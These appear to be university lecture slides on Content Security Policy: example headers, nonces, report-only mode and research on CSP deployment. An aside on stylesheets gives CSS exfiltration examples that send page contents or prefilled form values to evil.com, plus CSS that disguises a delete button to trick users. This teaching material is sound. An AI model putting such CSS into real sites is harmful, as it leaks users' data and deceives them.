
### Content Security Policy  {.smaller}


* <code>Content-Security-Policy</code>: HTTP header sent to browsers
* \\fbox{[]{.my-small} <code></code> Content-Security-Policy: default-src 'self' 'unsafe-inline'}
* says ‘‘only load things from <em>same host</em> or <em>embedded in webpage</em>’’ 

   * loading image from <code>evil.com</code> will fail

* \\fbox{\\parbox{11cm[]{.my-small} <code></code> Content-Security-Policy: script-src 'none';<br>object-src 'none'; style-src 'self'}}  

   * disallow all scripts, all plugins/etc.
   * only allow stylesheets from same host (and not inline)



### Aside: why care about stylesheets? (1) 


* historical: IE 7 supported CSS expressions that can construct URLs from webpage data
* getting web page contents:  
```
<link rel=stylesheet href="http://evil.com/?webpage contents here...

```

* also can do things with stylesheets


### Aside: why care about stylesheets? (2)  {.smaller}



* conditional image loaded to get data? assuming pre-filled-in-form:
 
```
input[value^=Virginia] {background: url(http://evil.com?Virginia)}

```
 

* adjust webpage display in lots of ways
 
```
.delete-form::before {content: "Please verify that you are human: ";}
button.cancel { display: none };
button.delete { font-size: 0pt; }
button.delete::before { content: "I am Human!"; font-size: 16pt; }

```


### Content Security Policy examples (1)  {.smaller}


* \\fbox{\\parbox{11cm<code></code> []{.my-small} Content-Security-Policy: script-src 'self' www.google-analytics.com; object-src 'none'}} 

   * allow scripts from same host or <code>www.google-analytics.com</code>
   * <em>disallow inline scripts</em>
   * disallow plugins

* \\fbox{\\parbox{11cm<code></code> []{.my-small} Content-Security-Policy: default-src 'none'; img-src 'self' https://…; …}}  

   * allow nothing to start; then whitelist what is needed
   * recommended strategy



### CSP nonces  {.smaller}


```html
Content-Security-Policy: script-src https://foo.com
                                    'nonce-DZJeVASMVs'

...
<script nonce="DZJeVASMVs">
// legitimate embedded script
document...
</script>

```
 

* nonce: ‘‘<em>n</em>umber used only <em>once</em>’’
* idea: <em>changes every time</em>; attacker can't guess for XSS attack 

   * browser doesn't enforce that it changes; server's job



### CSP report-only 


* content-security-policy-report-only 

   * don't block anything, but tell server if violation

* can use to check before setting binding policy
* can scan reports for possible issues without breaking webpage


### CSP feature expansion  {.smaller}


* originally: CSP was anti-XSS measure 

   * meant as ‘defense in depth’ --- in case normal filtering fails

* now also has directives to control 

   * embedding webpages without permission (e.g. ‘clickjacking’ attacks)
   * TLS usage



### CSP deployment (2020 paper) 


![](/web/roth-ndss-title){}


### CSP deployment (2014-2019) 


![](/web/roth-ndss-fig5){}


### CSP implementation bugs (1) 


![](/web/franken-title){}


### CSP implementation bugs (2)  {.smaller}


![](/web/franken-fig3){}
 
![](/web/franken-fig10){}
